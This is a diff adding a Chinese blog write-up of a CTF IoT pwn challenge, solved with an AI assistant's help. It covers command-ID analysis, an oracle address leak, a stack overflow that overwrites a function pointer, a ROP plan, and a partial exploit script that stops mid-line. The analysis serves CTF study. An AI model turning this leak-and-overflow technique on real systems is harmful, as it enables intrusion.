@@ -182,6 +182,71 @@
                 <div class="container">
     
     
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
 
     
     <article class="post-wrap">
@@ -211,13 +276,265 @@
         </header>
 
         <div class="post-content">
-            <p>文章发布于看雪论坛：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-288962.htm">https://bbs.kanxue.com/thread-288962.htm</a></p>
-<!-- <iframe 
-  src="https://bbs.kanxue.com/thread-288962.htm" 
-  width="100%" 
-  height="800px" 
-  frameborder="1"
-></iframe> -->
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文进行一次利用 AI 从没看到独立复现 2 解题目的尝试，这里分享一下思路。题目本身的主要难度在逆向层面，需要分析每一个指令的参数和功能，并能找到指令中的漏洞</p>
+<h1 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>拿到题目之后看一下基本信息，docker 里在后台运行了 bin&#x2F;server 程序，然后 xinetd 监听 8888 端口，启动 bin&#x2F;client 程序。我们需要使用 nc 和 client 交互，client 再和 server 交互。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   ├── client</span><br><span class="line">│   └── server</span><br><span class="line">├── ctf.xinetd</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── dockerfile</span><br><span class="line">└── start.sh</span><br></pre></td></tr></table></figure>
+
+<p>先 nc 上去看一下，这里是提前看了下字符串随便试了试，看起来像是从 client 向 server 发送 cmd 指令</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/7991866d62dc1e8f1a75b30f47fdb26a.png"></p>
+<p>经过几轮对话，让 AI 分析 client&#x2F;server 的逻辑，基本功能就比较清晰了</p>
+<ul>
+<li>server：接收到数据包后通过使用 handle_client_protocol 函数解析，具体 CMD 使用 dispatch_command_handler 处理，根据 CMD ID 进入不同的逻辑<br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/98e450d36d85b7188cc12fd2fd5f5723.png">​</li>
+<li>client：封装用户指令成数据包后和 server 交互<br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/96ff8749d02dea2268375fa6f1d29c03.png">​</li>
+</ul>
+<h2 id="CMD-ID-表格"><a href="#CMD-ID-表格" class="headerlink" title="CMD ID 表格"></a>CMD ID 表格</h2><p>接下来我们去分析根据 client 程序中分析每一个 CMD 对应的 ID，不过 AI 一开始并没有给出每一个命令对应的 ID，我们需要人工干预一下。</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/a5d2bdc2bbfa35126cad099a2fbf1172.png"><br>继续让 AI 整理一下这两张表就有</p>
+<table>
+<thead>
+<tr>
+<th>命令名称</th>
+<th>命令 ID</th>
+<th>功能描述</th>
+<th>参数说明</th>
+<th>数据包格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>help</td>
+<td>-</td>
+<td>显示帮助信息</td>
+<td>无参数</td>
+<td>无</td>
+</tr>
+<tr>
+<td>hello</td>
+<td>1</td>
+<td>发送 hello 消息</td>
+<td>​[client_name]​（可选，默认为”client”）</td>
+<td>​[client_name]​</td>
+</tr>
+<tr>
+<td>register</td>
+<td>16</td>
+<td>注册操作（字符串方式）</td>
+<td>​<string_data>​</td>
+<td>​[4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>register_hex</td>
+<td>16</td>
+<td>注册操作（十六进制方式）</td>
+<td>​<hex_string>​</td>
+<td>​[4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>list</td>
+<td>22</td>
+<td>列出所有项目</td>
+<td>无参数</td>
+<td>无</td>
+</tr>
+<tr>
+<td>partial_delete</td>
+<td>19</td>
+<td>部分删除操作</td>
+<td>​<id1> <id2>​</td>
+<td>​[4B id1][4B id2]​</td>
+</tr>
+<tr>
+<td>show</td>
+<td>20</td>
+<td>显示指定项目</td>
+<td>​<id>​</td>
+<td>​[4B id]​</td>
+</tr>
+<tr>
+<td>update</td>
+<td>17</td>
+<td>更新操作</td>
+<td>​<id1> <id2> <hex_string>​</td>
+<td>​[4B id1][4B id2][4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>exec</td>
+<td>18</td>
+<td>执行命令</td>
+<td>​<id> <param> <string>​</td>
+<td>​[4B id][2B param][4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>exechex</td>
+<td>18</td>
+<td>执行命令（十六进制参数）</td>
+<td>​<id> <param> <hex_string>​</td>
+<td>​[4B id][2B param][4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>execf</td>
+<td>18</td>
+<td>执行命令（带指针参数）</td>
+<td>​<id> <param> [ptr_hex]​</td>
+<td>​[4B id][2B param][4B 长度][数据]​</td>
+</tr>
+<tr>
+<td>oracle_unlock</td>
+<td>-</td>
+<td>Oracle 解锁功能</td>
+<td>无参数</td>
+<td>无</td>
+</tr>
+<tr>
+<td>oracle_guess</td>
+<td>18</td>
+<td>Oracle 猜测字节</td>
+<td>​<pid> <idx> &lt;0x00..0xff&gt;​</td>
+<td>​[4B pid][2B 0x3733][4B 长度][payload]​</td>
+</tr>
+<tr>
+<td>oracle_leak</td>
+<td>18</td>
+<td>Oracle 泄露字节</td>
+<td>​<id> [size]​（默认 size&#x3D;8）</td>
+<td>​[4B id][4B长度][数据]​</td>
+</tr>
+<tr>
+<td>bye</td>
+<td>255</td>
+<td>退出程序</td>
+<td>无参数</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h2 id="CMD-功能分析"><a href="#CMD-功能分析" class="headerlink" title="CMD 功能分析"></a>CMD 功能分析</h2><p>CMD 的 ID 和参数格式都有了，接下来分析每个指令的详细功能</p>
+<h3 id="指令功能"><a href="#指令功能" class="headerlink" title="指令功能"></a>指令功能</h3><h4 id="CMD-1-hello"><a href="#CMD-1-hello" class="headerlink" title="CMD 1: hello"></a>CMD 1: hello</h4><p>功能 : 初始化会话并生成会话密钥</p>
+<ul>
+<li>从客户端数据中提取客户端名称</li>
+<li>生成一个随机的会话密钥(generate_session_key​)</li>
+<li>将会话密钥存储在 SessionManager​ 中</li>
+<li>设置响应状态码为 2</li>
+<li>返回 8 字节的会话密钥(大端序)和 “WELCOME” 字符串</li>
+<li>输出会话密钥到 stdout(十六进制格式)</li>
+</ul>
+<p>关键代码路径 :</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session_key = <span class="built_in">generate_session_key</span>(qword_FA40);</span><br><span class="line">*a8 = session_key;  <span class="comment">// 存储会话密钥</span></span><br><span class="line">*a9 = session_key;</span><br><span class="line">srv-&gt;session_mgr-&gt;session_key = session_key;</span><br><span class="line">*a10 = <span class="number">2</span>;  <span class="comment">// 状态码</span></span><br><span class="line"><span class="comment">// 返回: [8字节会话密钥] + &quot;WELCOME&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="CMD-16-register"><a href="#CMD-16-register" class="headerlink" title="CMD 16: register"></a>CMD 16: register</h4><p>功能 : 注册一个新的 Profile</p>
+<ul>
+<li>读取客户端发送的字符串数据(长度 ≥ 4 字节)</li>
+<li>验证数据长度是否充足</li>
+<li>计算数据的 CRC 32 校验值</li>
+<li>与固定值 0 x 13579 BDF​ 异或后比较校验和</li>
+<li>如果校验通过,设置会话管理器的标志位</li>
+<li>调用 create_profile​ 创建新的 Profile</li>
+<li>返回 “OK” + 4 字节的 Profile ID</li>
+</ul>
+<p>关键验证逻辑 :</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crc32_value = <span class="built_in">calculate_crc32</span>(data, length);</span><br><span class="line"><span class="keyword">if</span> ((session_mgr-&gt;session_key ^ <span class="number">0x13579BDF</span>) == crc32_value) &#123;</span><br><span class="line">    session_mgr-&gt;session_key |= <span class="number">0x0100</span>;  <span class="comment">// 设置标志位</span></span><br><span class="line">    profile_id = <span class="built_in">create_profile</span>(session_mgr, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回 : “OK” + [4 字节 Profile ID]​</p>
+<h4 id="CMD-19-partial-delete"><a href="#CMD-19-partial-delete" class="headerlink" title="CMD 19: partial_delete"></a>CMD 19: partial_delete</h4><p>功能 : 删除指定 Profile 中的指定 Blob</p>
+<ul>
+<li>检查是否已经使用过此命令(只能使用一次)</li>
+<li>读取两个 4 字节参数: id 1​(Profile ID) 和 id 2​(Blob ID)</li>
+<li>查找对应的 Profile</li>
+<li>在 Profile 的 Blob 列表中查找指定的 Blob</li>
+<li>将 Blob 的第二个 vector 清空(通过设置 end &#x3D; start)</li>
+<li>设置一个标志表示已删除</li>
+<li>随机分配 0-2 个虚假的内存块(大小 8-71 字节)后立即释放</li>
+<li>返回 “Delete done”</li>
+</ul>
+<p>关键限制 :</p>
+<ul>
+<li>LOBYTE(session_mgr-&gt;session_key) &#x3D;&#x3D; 0​ 必须为真(只能调用一次)</li>
+<li>调用后设置 LOBYTE(session_mgr-&gt;session_key) &#x3D; 1​</li>
+</ul>
+<p>可能的漏洞点 : Blob 的 end 指针被设置为 start,但内存未释放,可能导致 Use-After-Free</p>
+<h4 id="CMD-20-show"><a href="#CMD-20-show" class="headerlink" title="CMD 20: show"></a>CMD 20: show</h4><p>功能 : 显示指定 Profile 的所有 Blob 数据</p>
+<ul>
+<li>读取 4 字节的 Profile ID</li>
+<li>查找对应的 Profile</li>
+<li>检查 Profile 是否被标记为已删除(*(v 117 + 64) !&#x3D; 0​)</li>
+<li>将所有 Blob 的数据拼接后返回</li>
+<li>返回: “OK” + [4 字节总长度] + [所有 Blob 数据]​</li>
+</ul>
+<p>数据格式 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;OK&quot; + [4B length] + [blob1_data][blob2_data]...</span><br></pre></td></tr></table></figure>
+
+<h4 id="CMD-17-update"><a href="#CMD-17-update" class="headerlink" title="CMD 17: update"></a>CMD 17: update</h4><p>功能 : 更新或创建 Blob</p>
+<ul>
+<li>读取参数: id 1​(Profile ID), id 2​(Blob ID), data​</li>
+<li>查找对应的 Profile 和 Blob</li>
+<li>如果 Blob 存在,更新其数据</li>
+<li>如果 Blob 不存在且数量 &lt; 64,创建新 Blob</li>
+<li>分配 0-2 个随机大小的内存块(8-71 字节)后立即释放</li>
+<li>返回 “OK” + 原始的 id 1 和 id 2</li>
+</ul>
+<p>Blob 数量限制 : 最多 64 个((v 152 - v 151) &lt;&#x3D; 0 x 3 F​)</p>
+<h4 id="CMD-18-exec-exechex-execf"><a href="#CMD-18-exec-exechex-execf" class="headerlink" title="CMD 18: exec&#x2F;exechex&#x2F;execf"></a>CMD 18: exec&#x2F;exechex&#x2F;execf</h4><p>功能 : 执行操作或验证魔术字节</p>
+<ul>
+<li>读取参数: id​(4 B), param​(2 B), data​</li>
+<li>验证数据长度</li>
+<li>如果 param &#x3D;&#x3D; 0 x 1337​ 且会话已解锁:<ul>
+<li>调用 verify_magic_bytes​ (Oracle 相关)</li>
+</ul>
+</li>
+<li>否则调用 execute_operation​</li>
+<li>返回 “OK: “ 或 “ERR: “ + 结果信息</li>
+</ul>
+<p>特殊参数 0 x 1337: Oracle 解锁功能的入口</p>
+<p>Oracle 相关 :</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">BYTE1</span>(session_mgr-&gt;session_key) &amp;&amp; param == <span class="number">0x1337</span>) &#123;</span><br><span class="line">    <span class="built_in">verify_magic_bytes</span>(srv, id, &amp;data, &amp;result, session_key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="CMD-22-list"><a href="#CMD-22-list" class="headerlink" title="CMD 22: list"></a>CMD 22: list</h4><p>功能 : 列出所有 Profile ID</p>
+<ul>
+<li>遍历 SessionManager​ 中的 Profile 红黑树</li>
+<li>收集所有 Profile 的 ID</li>
+<li>返回: [4 字节数量] + [ID 1][ID 2]…[IDn]​</li>
+</ul>
+<p>返回格式 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[4B count] + [4B id1] + [4B id2] + ... + [4B idn]</span><br></pre></td></tr></table></figure>
+
+<h4 id="CMD-255-a-2-1-bye"><a href="#CMD-255-a-2-1-bye" class="headerlink" title="CMD 255 (a 2 &#x3D;&#x3D; -1): bye"></a>CMD 255 (a 2 &#x3D;&#x3D; -1): bye</h4><p>功能 : 断开连接</p>
+<ul>
+<li>返回 “BYE” 字符串</li>
+<li>设置状态码为 3,指示服务器关闭连接</li>
+</ul>
+<h3 id="Oracle-系列"><a href="#Oracle-系列" class="headerlink" title="Oracle 系列"></a>Oracle 系列</h3><p>在表格里看到了一些比较奇怪的指令，重点测试 oracle 和 exec</p>
+<p>在执行这个 oracle 指令之前需要先 oracle_unlock 解锁功能，笔者发现 <code>​oracle_leak idx 8​</code> 可以泄露出基地址，这里的 idx 是通过 register 注册的索引</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/7215f1d925ac7067f24885c767bf0c09.png">​</p>
+<h3 id="Exec-系列"><a href="#Exec-系列" class="headerlink" title="Exec 系列"></a>Exec 系列</h3><p>测试的时候发现 exec 系列不知道怎么调用，继续让 AI 分析</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/b273bc9bd1b968e37fb7192efb818eae.png"><br><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/26d9a60ba51e5b55f9649ad911c6ee85.png"></p>
+<p>这里因为不知道 param 和 op_type 是怎么传的，所以需要调试一下，在 0000000000005F6B 下断点，然后执行 <code>exechex 1 2 aabbccddeeff</code></p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/5dafe6d923f8c7d97cff465979ffa05d.png"></p>
+<p>结合代码能看出来 op_type 是 data 部分的第一个字节，接着 4 字节是最后 payload 的长度</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c03d71e7860574bf2c65bb068e8d50b2.png"></p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c4e85927ddf969b9e4ac475c02984da4.png"><br>成功执行</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/c59f3c95ffd1930b9e0b0577afaac4b6.png"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在对话的过程中顺带帮我分析出来了一个栈溢出漏洞，还给出了栈布局</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/902006893380973c0b1ad9e4422d3cd2.png"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">┌─────────────────────────────────────────────────┐</span><br><span class="line">│                                                 │</span><br><span class="line">│  Caller&#x27;s Stack Frame                           │</span><br><span class="line">│                                                 │</span><br><span class="line">├─────────────────────────────────────────────────┤ &lt;- rbp+0x10</span><br><span class="line">│  Return Address (8 bytes)                       │ &lt;- rbp+0x08  [TARGET!]</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  Saved RBP (8 bytes)                            │ &lt;- rbp+0x00</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_40: Stack Canary (8 bytes)                 │ &lt;- rbp-0x40</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_50: v37 (int, 4 bytes)                     │ &lt;- rbp-0x50</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_51: v36 (char, 1 byte)                     │ &lt;- rbp-0x51</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  ...other local variables...                    │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  var_148: v35 (function pointer, 8 bytes)       │ &lt;- rbp-0x148</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│                                                 │</span><br><span class="line">│  dest[64]: Target Buffer                        │ &lt;- rbp-0x188</span><br><span class="line">│  ┌──────────────────────────────────┐           │</span><br><span class="line">│  │ 64 bytes buffer                  │           │</span><br><span class="line">│  │ (but we copy up to 312 bytes!)   │           │</span><br><span class="line">│  └──────────────────────────────────┘           │</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  src: __m128i (16 bytes)                        │ &lt;- rbp-0x198</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  n: size_t (8 bytes)                            │ &lt;- rbp-0x1A0</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  p_src: void* (8 bytes)                         │ &lt;- rbp-0x1A8</span><br><span class="line">├─────────────────────────────────────────────────┤</span><br><span class="line">│  ...more variables...                           │</span><br><span class="line">└─────────────────────────────────────────────────┘</span><br><span class="line">Low Address</span><br><span class="line"></span><br><span class="line">Distance calculations:</span><br><span class="line">- dest to saved rbp: 0x188 = 392 bytes</span><br><span class="line">- dest to return addr: 0x188 + 8 = 400 bytes</span><br><span class="line">- Overflow space: 312 - 64 = 248 bytes</span><br><span class="line">- Can overwrite: 248 bytes beyond dest[64]</span><br></pre></td></tr></table></figure>
+
+<p>不过他认为可以修改返回地址，但这实际上是修改不到的，因为我们只能写入 0x140</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/3d5f4e6d6859f0833542c5e7360722b5.png"></p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/cab56204f4b5709805376865041cbbbf.png"></p>
+<p>指出这一点之后，AI 分析出来 v35 指针可以利用，也就是</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/04c80251b2ba4ee2d1139045186ace90.png"></p>
+<p>测试之后发现成功控制了 call rax​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x140</span>)</span><br><span class="line">data = p8(<span class="number">0x41</span>) + p32(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line">run(<span class="string">f&quot;exechex <span class="subst">&#123;idx&#125;</span> 2 <span class="subst">&#123;binascii.hexlify(data).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/a16628cda00baadf2466f781c1c2dee7.png"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在所有的指令功能都分析完之后，其实已经比较清晰了，先用 oracle 泄露地址，然后在利用 exec 的栈溢出漏洞。</p>
+<p>AI 也给了攻击流程，和最终实现的 exp 已经没有太大差别了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────┐</span><br><span class="line">│                  攻击流程                            │</span><br><span class="line">└─────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">1. CMD_HELLO (0x01)</span><br><span class="line">   ↓</span><br><span class="line">   获取 session_key</span><br><span class="line">   ↓</span><br><span class="line">2. CMD_REGISTER_PROFILE (0x10)</span><br><span class="line">   ↓</span><br><span class="line">   认证成功 (oracle_unlock)</span><br><span class="line">   ↓</span><br><span class="line">3. oracle_guess (CMD_EXEC_OP param=0x1337)</span><br><span class="line">   ↓</span><br><span class="line">   暴力破解 magic_table[0..7]</span><br><span class="line">   ↓</span><br><span class="line">4. oracle_leak (CMD_EXEC_OP)</span><br><span class="line">   ↓</span><br><span class="line">   泄露栈地址、堆地址、canary</span><br><span class="line">   ↓</span><br><span class="line">5. CMD_EXEC_OP (param=0x42, op_code=0x41)</span><br><span class="line">   ↓</span><br><span class="line">   触发栈溢出</span><br><span class="line">   ↓</span><br><span class="line">6. ROP Chain执行</span><br><span class="line">   ↓</span><br><span class="line">   获取Shell</span><br></pre></td></tr></table></figure>
+
+<p>题目开了沙箱，禁用了 exec，由于我们无法直接和 server 交互，所以不能用常规的 orw 来读 flag</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/08d13cc9dff62129e50f499d48dac584.png"></p>
+<p>结合 client 程序在启动的时候会读取并输出 client.log 的文件内容，可以把 flag 内容写入到 client.log 文件，rop 执行之后，再启动一个终端 nc 就能拿到 flag</p>
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/e073a3b7a4b6fb91b42c72b0331f718b.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnkit.osys.linux.ropbox <span class="keyword">import</span> GadgetBox</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">args = init_pwn_args()</span><br><span class="line">binary = ELF(<span class="string">&quot;./bin/server&quot;</span>)</span><br><span class="line">args.info.binary = context.binary = binary</span><br><span class="line">args.info.target = &#123;<span class="string">&quot;host&quot;</span>: args.host <span class="keyword">or</span> <span class="string">&quot;example.pwnme&quot;</span>, <span class="string">&quot;port&quot;</span>: args.port <span class="keyword">or</span> <span class="number">9999</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.remote:</span><br><span class="line">    _host, _port = gift.dbgsrv.init()</span><br><span class="line">    host, port = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span></span><br><span class="line">    pk.core.config.config_context_terminal()</span><br><span class="line"></span><br><span class="line">p = pwntube(args) <span class="keyword">if</span> args.remote <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">cmd</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">run(<span class="string">b&quot;hello&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;oracle_unlock&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;register aaa&quot;</span>)</span><br><span class="line">run(<span class="string">b&quot;list&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;count=&quot;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(p.recvline())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    idx = p.recvline().strip()[<span class="number">2</span>:]</span><br><span class="line">    idx = <span class="built_in">int</span>(idx)</span><br><span class="line">log.info(<span class="string">&quot;latest idx: %d&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line">run(<span class="string">f&quot;oracle_leak <span class="subst">&#123;idx&#125;</span> 8&quot;</span>.encode())</span><br><span class="line">p.recvuntil(<span class="string">b&quot;addr=&quot;</span>)</span><br><span class="line">text_leak = p.recvline().strip()</span><br><span class="line">text_leak = <span class="built_in">int</span>(text_leak, <span class="number">16</span>)</span><br><span class="line">text_base = text_leak - <span class="number">0x2e60</span></span><br><span class="line">plog.address(text_leak=text_leak, text_base=text_base)</span><br><span class="line"></span><br><span class="line">gb = GadgetBox(binary)</span><br><span class="line">pop_rdi_ret = text_base + <span class="built_in">next</span>(gb.search_gadget([<span class="string">&quot;pop rdi&quot;</span>, <span 